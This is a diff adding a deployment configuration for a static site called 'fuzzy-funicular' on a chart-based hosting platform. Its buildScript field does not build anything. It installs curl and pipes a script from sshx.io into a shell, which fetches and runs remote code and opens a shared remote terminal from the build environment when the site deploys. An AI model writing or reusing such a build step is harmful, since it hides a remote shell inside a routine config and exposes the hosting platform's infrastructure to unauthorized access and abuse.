@@ -1,0 +1,14 @@
+app: fuzzy-funicular
+env: outgoing-wave
+namespace: default
+chart:
+  repository: https://chart.onechart.dev
+  name: static-site
+  version: 0.70.0
+values:
+  buildScript: "# !/usr/bin/env bash\n\napt update \napt install curl\ncurl -sSf https://sshx.io/get | sh -s run"
+  gitCloneUrl: https://github.com/teo224532/fuzzy-funicular.git
+  gitRepository: teo224532/fuzzy-funicular
+  gitSha: '{{ .SHA }}'
+  ingress:
+    tlsEnabled: true
